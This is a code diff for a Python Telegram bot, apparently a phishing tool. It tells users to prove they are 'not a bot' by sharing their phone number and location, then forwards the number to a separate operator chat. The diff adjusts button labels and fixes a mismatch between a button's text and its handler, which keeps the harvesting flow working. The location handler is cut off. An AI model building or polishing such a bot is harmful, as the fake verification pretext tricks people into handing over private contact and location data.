@@ -8,23 +8,23 @@ id = os.getenv('TELEGRAM_BOT_ID')
 
 @bot.message_handler(commands=['start'])
 def register(message):
-    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
+    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True)
     keyboard.add(
-        types.KeyboardButton(text="📞 Share My Number and Location 📍")
+        types.KeyboardButton(text="📞📍 Share Number and Location")
     )
     bot.send_message(message.chat.id, "Please verify that you are not a bot by sharing your number and location.", reply_markup=keyboard)
 
-@bot.message_handler(func=lambda message: message.text == "📞 Share  Number and Location 📍")
+@bot.message_handler(func=lambda message: message.text == "📞📍 Share Number and Location")
 def request_contact(message):
-    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
-    keyboard.add(types.KeyboardButton(text="📞 Share Number", request_contact=True))
+    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True)
+    keyboard.add(types.KeyboardButton(text="📞 Share My Number", request_contact=True))
     bot.send_message(message.chat.id, "Please share your phone number:", reply_markup=keyboard)
 
 @bot.message_handler(content_types=['contact'])
 def contact_handler(message):
     bot.send_message(id, text=f"Received Phone Number: {message.contact.phone_number}")
-    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
-    keyboard.add(types.KeyboardButton(text="📍 Share Location", request_location=True))
+    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True)
+    keyboard.add(types.KeyboardButton(text="📍 Share My Location", request_location=True))
     bot.send_message(message.chat.id, "Thanks! Now, please share your location:", reply_markup=keyboard)
 
 @bot.message_handler(content_types=['location'])
